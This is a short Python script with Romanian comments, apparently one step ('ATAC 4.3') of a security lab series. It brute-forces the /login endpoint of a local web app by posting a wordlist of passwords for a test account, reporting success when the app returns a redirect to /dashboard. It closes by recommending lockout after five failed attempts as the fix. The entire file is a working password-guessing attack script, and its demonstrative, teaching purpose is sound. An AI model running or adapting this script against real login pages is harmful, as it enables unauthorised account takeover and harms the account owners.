"""
ATAC 4.3 — Brute Force / Lipsa Rate Limiting
=============================================
Demonstreaza ca endpoint-ul /login nu limiteaza numarul
de incercari, permitand ghicirea parolei prin forta bruta.

Vulnerabilitate: nicio blocare dupa N incercari gresite,
                 nicio intarziere, nicio detectie.
Impact: un atacator poate incerca mii de parole automat
        pana gaseste una corecta.
"""

import requests
import time

BASE_URL = "http://127.0.0.1:5000"

# Tinta: un cont existent (creat in atacul 4.1)
TARGET_EMAIL = "test@test.com"

# Lista de parole de incercat (dictionar simplu)
WORDLIST = [
    "wrongpass", "notright", "badpassword",
    "abc123", "letmein", "admin", "qwerty",
    "1",  # <-- parola corecta (setata in atacul 4.1)
    "password", "12345",
]

print("=" * 55)
print("  ATAC 4.3 — Brute Force pe /login")
print("=" * 55)
print(f"  Target: {BASE_URL}/login")
print(f"  Email:  {TARGET_EMAIL}")
print(f"  Parole incercate: {len(WORDLIST)}")
print("=" * 55)

start = time.time()
gasita = False

for i, parola in enumerate(WORDLIST, 1):
    response = requests.post(
        f"{BASE_URL}/login",
        data={"email": TARGET_EMAIL, "password": parola},
        allow_redirects=False  # vrem sa vedem redirect-ul, nu pagina finala
    )

    # Login reusit = redirect catre /dashboard (302)
    if response.status_code == 302 and "/dashboard" in response.headers.get("Location", ""):
        elapsed = time.time() - start
        print(f"  [{i:>3}] '{parola}' → PAROLA GASITA! (dupa {elapsed:.2f}s)")
        gasita = True
        break
    else:
        print(f"  [{i:>3}] '{parola}' → gresita (HTTP {response.status_code})")

print()
if gasita:
    print(f"[!] Brute force reusit! Contul {TARGET_EMAIL} a fost compromis.")
    print(f"[!] Aplicatia nu a blocat nicio incercare.")
else:
    print("[!] Parola nu a fost gasita in wordlist-ul curent.")

print()
print("[!] Concluzie: fara rate limiting, un atacator poate")
print("[!] incerca mii de parole pe minut fara nicio restrictie.")
print("[!] Fix: blocare temporara dupa 5 incercari gresite.")
